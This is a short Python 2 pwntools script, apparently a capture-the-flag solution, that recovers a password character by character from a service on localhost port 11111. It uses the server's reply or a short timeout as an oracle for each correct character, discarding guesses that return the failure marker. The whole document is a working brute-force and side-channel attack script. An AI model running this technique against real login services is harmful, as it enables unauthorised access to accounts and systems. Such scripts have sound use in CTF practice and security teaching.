from pwn import *
context.log_level = 'error'

passw = ''

try:
    while True:
        for i in xrange(33, 127):
            r = remote('127.0.0.1', 11111)
            r.recvuntil('Password: ')
            print "trying", passw + chr(i)
            r.sendline(passw + chr(i))
            ret = r.recvline(timeout=0.001)
            if ret:
                if '(x_x)/' not in ret:
                    raise Exception(ret)
                passw += chr(i)
                break
            r.close()
except Exception as e:
    print e